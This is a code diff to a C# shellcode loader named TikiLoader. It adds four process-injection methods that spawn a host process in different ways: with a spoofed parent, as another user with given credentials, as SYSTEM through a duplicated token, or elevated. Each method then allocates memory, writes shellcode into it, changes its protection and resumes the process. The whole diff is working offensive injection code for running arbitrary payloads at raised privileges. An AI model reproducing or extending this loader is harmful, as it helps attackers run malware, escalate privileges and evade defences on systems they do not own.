@@ -39,5 +39,41 @@ namespace TikiLoader
             ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
             ResumeProcess(pinf.hProcess, baseAddr);
         }
+
+        public static void CRTInjectWithoutPid(string binary, byte[] shellcode)
+        {
+            var pinf = StartProcessWOPid(binary);
+            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+            ResumeProcess(pinf.hProcess, baseAddr);
+        }
+
+        public static void CRTInjectAs(string binary, string domain, string username, string password, byte[] shellcode)
+        {
+            var pinf = StartProcessAs(binary, domain, username, password);
+            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+            ResumeProcess(pinf.hProcess, baseAddr);
+        }
+
+        public static void CRTInjectAsSystem(string binary, int pidToDuplicate, byte[] shellcode)
+        {
+            var pinf = StartProcessAsSystem(binary, pidToDuplicate);
+            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+            ResumeProcess(pinf.hProcess, baseAddr);
+        }
+
+        public static void CRTInjectElevated(string binary, int elevatedPid, byte[] shellcode)
+        {
+            var pinf = StartElevatedProcess(binary, elevatedPid);
+            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+            ResumeProcess(pinf.hProcess, baseAddr);
+        }
     }
 }
